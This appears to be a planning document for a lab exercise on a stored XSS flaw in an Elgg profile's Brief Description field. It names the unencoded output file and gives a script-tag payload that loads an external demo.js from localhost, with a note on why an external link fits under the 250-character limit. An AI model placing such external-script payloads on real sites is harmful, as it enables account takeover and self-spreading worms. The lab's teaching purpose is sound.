# Plan 02 — Stored XSS Analysis (Brief Description)

## Objective
Demonstrate and explain the **stored XSS** vulnerability on the 250-character
Brief Description field, and why an **external-script link** is the right
technique under the length limit — using only a harmless proof of concept.

## Tasks
1. Identify the Brief Description field and its 250-char input limit.
2. Analyse storage & rendering: `output/text.php` echoes raw (encoding commented
   out), so stored markup executes.
3. Craft a **harmless** payload: `<script src="http://localhost:8000/demo.js">`
   stored in Brief Description; confirm `demo.js` executes (banner + alert).
4. Compare behaviour: after save, after reload, and when viewed from another
   account (Alice views Samy).
5. Explain length math: inline worm ≫ 250 chars vs. link reference ≪ 250 chars.
6. Document encoding vs. byte-length with the payload validator.

## Dependencies
- Plan 01 (Elgg up). Plan 03 (`demo.js` host running).

## Acceptance criteria
- Harmless `demo.js` runs from the stored Brief Description reference.
- The difference between a sanitized/encoded field and this disabled-encoding
  field is clearly explained with the exact source lines.
- Link payload shown to fit within 250 chars via `validate-payload`.

## Tests
- `tests/test_payload_validator.py` (limit, Unicode, boundaries).
- Manual: DevTools Console shows `demo.js` log; Network shows the external fetch.

## Expected evidence
- `docs/analysis/stored-xss-analysis.md`.
- Screenshots: Brief Description with payload; alert/banner firing; Network tab
  showing the external `demo.js` request and its `application/javascript` type.

## Proposed Git commit
`docs(xss): stored-XSS analysis + harmless Brief Description PoC`
